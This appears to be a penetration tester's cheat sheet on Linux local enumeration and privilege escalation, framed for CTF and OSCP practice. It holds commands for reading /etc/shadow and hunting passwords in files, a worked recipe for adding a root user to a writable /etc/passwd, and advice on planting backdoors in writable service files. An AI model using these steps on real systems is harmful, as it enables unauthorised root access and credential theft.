# Linux Local Enumeration

* [Whoami?](#whoami)
* [Useful Tools Installed?](#useful-tools-installed)
* [Other Users](#other-users)
* [System](#system)
* [Network](#network)
* [Drives and Mounts](#drives-and-mounts)
* [User Management File Permissions](#easy-win-user-management-file-permissions)
* [Sudo](#sudo)
* [Enum Scripts](#enum-scripts)
* [Environment Variables](#environment-variables)
* [Interesting Files](#interesting-files)
* [Cron and Friends](#cron-and-friends)
* [SUID and GUID](#suid-and-guid)
* [Service Exploits](#service-exploits)
* [NFS](#nfs)

## Whoami?

Who are you and what can you do?

```bash
# username
whoami
who
w

# groups
id
id <username>
```

Common **instant win** groups:

* **disk** (full disk access with `debugfs`)
* **docker** (mount host file system via docker, i.e. full disk access)
* **lxd / lxc** (mount host file system via linux containers, i.e. full disk access)
* **wheel** (usually gives full root sudo)
* **sudo** (see wheel)
* **admin** (see wheel, might differ)

Instant win groups that you probably won't ever see on a regular user:

* **root** (most root user files are also accessible by the root group)
* **shadow** (read shadow file and extract user hashes)

**Potential win** groups:

* **video** (access screen output of other user sessions)
* **adm** (allows reading potentially sensitive logs in /var/log/)
* **mail** (allows reading mails in /var/mail/)


## Useful Tools Installed?
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc rkt kubectl 2>/dev/null
```

## Other Users

```bash
cat /etc/passwd
```

Save the output to a file for later reference. 

In your enumeration notes write down **non-standard users**, in particular users with shell (e.g. /bin/bash or /bin/sh). Save those usernames to a list file as well for future reference and **credential spraying**. You can also look in the home directory to see which users are potentially valuable `ls -al /home`.

You can use `id <username>` to see the groups of potentially interesting users.

## System

```bash
# Figure out Kernel version, OS, Processor Architecture
uname -a

## alternatives
lsb_release -a
cat /proc/version
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release

## 32 or 64 bit?
getconf LONG_BIT
```

You can use searchsploit in order to find kernel exploits. Make sure to start with the specific version and then get more broad to find more results:

```bash
searchsploit linux kernel 3.5.1
searchsploit linux kernel 3.5.
searchsploit linux kernel 3.5
searchsploit linux kernel 3.
```

The kali repository also has linux-exploit-suggester.sh (`sudo apt install linux-exploit-suggester`). Which you can either execute on the target directly or on your own machine. See the tools section below for more info.

For example a noteworthy kernel exploit is **Dirty Cow** (Kernel version 2.6.22 < 3.9). Thanks to the large range of affected kernel versions, a lot of old systems are affected.

You probably want to look and try other less intrusive privesc paths first, but if all of those fail you can fall back on the enumerated kernel exploits.


## Network

```bash
# hostname
hostname
dnsdomainname

# IP address(es) and interfaces
ip addr
ifconfig

# Networks
cat /etc/networks
cat /etc/sysconfig/network

# Hosts file / DNS
cat /etc/hosts
cat /etc/resolv.conf

# ARP table (neighboring hosts)
cat /proc/net/arp
arp -a

# firewall (might need root)
iptables -L

# Printers
lpstat -a
cat /etc/printcap
```

## Drives and Mounts

Drives:
```bash
df -h
lsblk
fdisk -l
```

Mounts:
```bash
findmnt
mount
df -aTh
cat /proc/mounts
cat /proc/self/mounts
```

## Easy Win: User Management File Permissions

Some files are often left with insecure permissions because of user error (e.g. a user changed permissions on a file in order to edit it and then did not change them back). In CTFs this is considered the lowest of the low hanging fruit, so you might encounter this on a beginner machine.

I just list this so early because it can be checked very quickly and if you miss it you are going to feel like a dumbass.

Check the file permissions on the following files:

```bash
ls -al /etc/passwd /etc/shadow /etc/group /etc/gshadow /etc/sudoers

ls -al /etc/passwd
ls -al /etc/shadow
ls -al /etc/sudoers
ls -al /etc/group
ls -al /etc/gshadow
```

You have won, if...

* ...you can **write to any** of these files. You can just give yourself the root user id or group id. Or give yourself full sudo permissions. Hashes in passwd take precedent over shadow by the way.
* ...you can **read shadow** and there are **crackable hashes**
* ...you can **read gshadow** and there are **crackable hashes** (unlikely, but check anyway)

Being able to **read the sudoers** file can also be useful, allowing you to enumerate the sudo permissions of all the users on the system.

There are other interesting files that can show up in /etc/ that might allow you to elevate privileges, so maybe search through the entire directory for insecure file permissions if you are stuck.

One somewhat famous exploit envolved insecure file permissions on `/etc/update-motd.d`, which creates a custom motd (message of the day) whenever a user logs in. So scripts that are owned by root and are writable by you, should be of particular interest.

### Creating a new passwd entry

Here is how you can manually add an entry to a writable /etc/passwd file. By the way: hashes in the passwd file take precedent over the shadow file thanks to legacy support.

```bash
# create a MD5-based ($1$ hash)
openssl passwd -1 -salt hack cowabunga77
$1$hack$Ms0RDU0fPwY2uBBL9/Cnb/

# (alternative) create a sha-512 ($6$ hash)
mkpasswd -m sha-512 cowabunga77
```

Add the new root (0:0) user at the bottom of the /etc/passwd file.
```bash
hack:$1$hack$Ms0RDU0fPwY2uBBL9/Cnb/:0:0:root:/root:/bin/bash
```

Now you can use `su hack` in order to switch to root.


## Sudo

🠒 See the [dedicated sudo notes](./linux/sudo.md) for more details and exploitation examples.

---

If you can read the `/etc/sudoers` file, then do so first. Look at your own permissions and look for users who have better permissions.

Otherwise check what you can run:

```bash
# check own sudo access rules
sudo -l
```

Note that this might cause **failed password attempts** if you do not know the password of the current user (noisy). Often you can run this without having to type the password though.

If you have `(ALL : ALL) ALL` then you can use sudo to have **full root privileges**, assuming you know the password. `(ALL) NOPASSWD: ALL` means you can do so without having to type a password at all.

Switch to a root shell with:

```bash
# switch to root
sudo su -
```

If you can run commands as another user, e.g. `(someuser : somegroup)`, then you want to check what interesting files are owned by that user. Also you can impersonate that user with:

```bash
# impersonate another user with sudo
sudo -u <user> <command>
sudo -u someuser whoami
```

If you see `env_keep+=LD_PRELOAD` or `env_keep+=LD_LIBRARY_PATH` in the `sudo -l` output then you might also be able to privesc to root rather easily. See the [dedicated sudo notes](./linux/sudo.md) for more info on this.


### Limited Sudo

If your sudo privileges are restricted to some specific programs, then look for possible escape methods:

**GTFOBins** - https://gtfobins.github.io/


### Vulns in Sudo

Enumerate the sudo version with:

```bash
sudo -V
```

Search for exploits:
```bash
searchsploit sudo
searchsploit sudo <version_num_here>
```


## Enum Scripts

🠒 See also Linux Enum Scripts notes

---

You should run these after quickly checking the low hanging fruit above, these scripts will save you a lot of time. Make sure to re-run these when you gain a new user.

A common writable location is /tmp/ just make a new directory in there.

The ones I found particular useful are:

* **LinPEAS** - linpeas.sh - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
* **Linux Smart Enumeration** - lse.sh - https://github.com/diego-treitos/linux-smart-enumeration

I usually run both and transfer the output to my own machine for future reference (also for pretty color output). They do similar things, but some things only get caught by one of them.

```bash
chmod +x linpeas.sh
./linpeas.sh -a > linout.txt &
```

```bash
chmod +x lse.sh
./lse.sh -l2 -i > lseout.txt &
```

The `&` runs them as background jobs so you can do other things while it runs. You can check the progress by typing `jobs`. Just omit the ampersand if there are problems.

As mentioned above there is also a useful script for finding kernel exploits:

* **Linux Exploit Suggester** - https://github.com/mzet-/linux-exploit-suggester

You can execute it on the target directly:

```bash
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh > kernel_enum.txt
```

Or on your own machine by supplying the kernel version as parameter:

```bash
./linux-exploit-suggester.sh -k 3.5.1
./linux-exploit-suggester.sh --uname "<uname-string>"
# uname -a
```

## Environment Variables

Look for interesting strings in the environment variables.

```bash
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

## Interesting Files

You should look for files that users left lying around carelessly and files with lax permissions.

First check the root (base) directory / for uncommon folders.

### /home/

Check /home/ for readable user directories. Also check if you can read /root/

Especially interesting here are:

* Notes and backups
* .ssh directory content (private keys, authorized_keys)
* .bash_history
* keypass and co.
* browser password storages

### /var/

* web server directories (often /var/www/) containing config files and other files with credentials
* readable logs
* readable backups
* readable mail
* check spool

### /opt/

* commercial (non-free) monolithic software
* software not deployed via common package mangers

### /mnt/

* Temporarily mounted filesystems

### /usr/local

* Non-system-default locally installed software

### /srv/

* Served files. But this is rarely used. Usually served files are stored somewhere in /var/ instead. Doesn't hurt to check though.

### Search commands

You can easily get into the weeds with this, so try to limit your searches first and then broaden your scope. 

Remove the --color flag on ls if it is not supported by your shell.

-xdev prevents following mounted file systems, sometimes you want to do that though.

```bash
# (anything not directory) owned by root that you can write to
## replace root with the user you want to investigate
find / -writable -user root -not -type d -xdev -exec ls --color -al {} \; 2>/dev/null
find / -writable -user root -not -type d -not -path '/proc/*' -not -path '/sys/*' -not -path '/spool/*' -exec ls --color -al {} \; 2>/dev/null

# (directories) owned by root that you can write to
ind / -writable -user root -type d -exec ls --color -ld {} \; 2>/dev/null
find / -writable -user root -type d -not -path '/proc/*' -not -path '/sys/*' -not -path '/spool/*' -exec ls --color -al {} \; 2>/dev/null

# (anything not directory) writable and not owned by me
find / -writable ! -user `whoami` -not -type d -xdev -exec ls --color -al {} \; 2>/dev/null
find / -writable ! -user `whoami` -not -type d ! -path "/proc/*" ! -path "/sys/*" -not -path '/spool/*' -exec ls --color -al {} \; 2>/dev/null
```

You can also search for files by change date:
```bash
# find files changed in the last X days. Adjust mtime with a value in days.
find / -user root -mtime -1 -not -type d -xdev -exec ls --color -al {} \; 2>/dev/null

# modified time:             -mtime 
# access time:               -atime
# change (meta data) time:   -ctime
```

Just replace "." with "/" to search the entire system instead of starting with the current directory.

Find **files containing** "passw" and print the 10 chars before and 40 chars after the match (might be spammy):
```bash
# "passw"
find . -readable -type f -exec grep -oiE ".{0,10}passw.{0,40}" {} \; 2>/dev/null

# "password:"
find . -readable -type f -exec grep -oiE ".{0,10}password:.{0,40}" {} \; 2>/dev/null
find . -readable -type f -exec grep -oiE ".{0,10}password :.{0,40}" {} \; 2>/dev/null

# "password="
find . -readable -type f -exec grep -oiE ".{0,10}password=.{0,40}" {} \; 2>/dev/null
find . -readable -type f -exec grep -oiE ".{0,10}password =.{0,40}" {} \; 2>/dev/null
```

Find files that have "passw" or "secret" in their **filenames**:
```bash
# find files by filenames
find / -not -type d \( -iname "*passw*" -o -iname "*secret*" \) -exec ls --color -al {} \; 2>/dev/null

# find dirs by directory names
find / -type d \( -iname "*passw*" -o -iname "*secret*" \) -exec ls --color -d {} \; 2>/dev/null
```

Find writable files in /etc/
```bash
# writable files in /etc
find /etc -writable -not -type d -exec ls -al {} \; 2>/dev/null

# writable directories in /etc
find /etc -writable -type d -exec ls -d {} \; 2>/dev/null
```

## Cron and Friends

🠒 See [the dedicated Cron notes](./linux/cron.md) for more details and exploitation examples.

---

Crontabs should already be enumerated by the scripts above, but if you have to do it manually for some reason, here's the quick version:

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

### Pspy

Cron is not the only way to regularly execute tasks. And you cannot always keep track of every cron tasks just by looking at readable files.

A particularly handy tool for observing what gets executed over time is **psypy** - https://github.com/DominicBreuker/pspy

Just keep it running for a while and look for scripts and odd binaries that get executed by root (UID=0) or your target user regularly.


## SUID and GUID

🠒 See the [dedicated SUID/SGID notes](./linux/suid.md) for more details and exploitation examples.

---

* A binary with the **SUID** bit set will be executed with permissions of the **user** who owns the file. So we are interested in SUID binaries owned by the root user.
* A binary with the **SGID** bit set will be executed with permissions of the **group** who owns the file. So we are interested in SGID binaries owned by the root group or other powerful groups.

Obviously the end goal is to get the binary in question to execute a command for us, which will then be executed with the more powerful user id or group id.

If an Error in Layer 8 put a SUID bit on `/bin/bash` or `/bin/cp`, then this process is rather straightforward, but with other binaries we need to get creative. Or we might not be able to exploit it at all, which is usually the case with default SUID binaries like `su` or `passwd`.

Search commands:
```bash
# Find all SUID and SGID files
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -al {} \; 2> /dev/null

# Files with SUID
find / -type f -perm -u+s -exec ls -al {} \; 2> /dev/null

# Files with SGID
find / -type f -perm -g+s -exec ls -al {} \; 2> /dev/null

# root only
## SUID owned by root user
find / -user root -type f -perm -u+s -exec ls -al {} \; 2> /dev/null

## SGID owned by root group
find / -group root -type f -perm -g+s -exec ls -al {} \; 2> /dev/null
```

Once again use **GTFOBins** (also Google) to find ways to exploit the found binaries: https://gtfobins.github.io/

You are in particularly interested in:

* **Uncommon** SUID binaries (takes some experience, also ask Google)
* **Default binaries that usually should not have** a SUID bit (you can compare those to your own machine, also ask Google)
* **Outdated** SUID binaries with known exploits

For the last point try to enumerate the versions and search google/searchsploit for exploits.

```bash
# Example version enumeration on SUID binary
/usr/sbin/exim --version
/usr/sbin/exim -v
```

Especially with uncommon/custom SUID binaries you might be able to **highjack shared libraries** called by the binary or otherwise take advantage of path highjacking tricks.

See the [dedicated SUID/SGID notes](./linux/suid.md) for more info on path highjacking and other suid exploits.


## Service Exploits

🠒 See the [dedicated service exploitation notes](./linux/services.md) for more details and exploitation examples.

---

Enum commands:

```bash
ps aux
ps -ef
top
top -n 1
cat /etc/services

dpkg -l #Debian
rpm -qa #Centos
```

### Relative Path Exploits

Check the path used by systemctl
```bash
systemctl show-environment
```

If you can write to one of the locations on the path, then you might be able to elevate privileges. 

For that you will have to find a service that does not supply the path to a called binary. 

For example it would say something like
```bash
ExecStart=somebinary
```
instead of 
```bash
ExecStart=/usr/bin/somebinary
```
Then you can create that binary and hopefully it takes precedent over the real intended binary.


Find enabled services:
```bash
systemctl list-unit-files | grep enabled
```

### Insecure File Permissions

Check if you can write any .service file, if you can, you could modify it so it executes your backdoor when the service is started, restarted or stopped (maybe you will need to wait until the machine is rebooted).

For example create your backdoor inside the .service file with `ExecStart=/tmp/script.sh`

## NFS

🠒 See the [dedicated NFS exploitation notes](./linux/nfs.md) for more details and exploitation examples.

---

You might be able to mount an NFS share with root permissions if there are shares with the no_root_squash option.

Check the contents of `/etc/exports` for shares with the `no_root_squash` option:
```bash
$ cat /etc/exports
...
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

## Refereences And Useful Links

* g0tmilk - **Basic Linux Privilege Escalation** - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
* Tib3rius - **Linux Privilege Escalation for OSCP & Beyond!** (costs money) - https://www.udemy.com/course/linux-privilege-escalation/
* hacktricks - **Linux Privilege Escalation** - https://book.hacktricks.xyz/linux-unix/privilege-escalation
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
